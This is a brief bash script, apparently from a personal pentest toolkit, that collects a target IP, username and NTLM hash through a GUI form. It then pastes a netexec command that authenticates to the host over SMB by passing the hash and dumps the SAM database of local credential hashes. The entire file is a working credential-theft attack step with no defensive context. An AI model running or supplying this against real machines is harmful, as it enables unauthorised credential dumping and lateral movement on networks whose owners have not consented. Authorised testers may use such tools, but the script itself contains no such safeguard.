#!/bin/bash

: '
dump sam
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "IP" "Username" "Hash"

IP=${form_data["IP"]}
USERNAME=${form_data["Username"]}
HASH=${form_data["Hash"]}

paste_command "netexec smb ${IP} --local-auth -u '${USERNAME}' -H ${HASH} --sam"
